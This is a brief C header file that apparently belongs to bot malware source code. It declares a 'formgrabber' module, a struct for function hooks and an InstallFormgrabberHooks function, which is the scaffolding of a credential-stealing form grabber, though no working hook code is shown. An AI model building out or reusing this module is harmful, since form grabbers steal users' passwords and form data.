#pragma once
#include "modules.h"

#ifdef MODULE_FORMGRABBER
#include "../common/bot_structs.h"

typedef struct
{
	LPSTR pszFunctionName;
	LPVOID lpCallback;
	LPVOID* lppOriginal;
}formgrabber_hook_t;

BOOL WINAPI InstallFormgrabberHooks();
#endif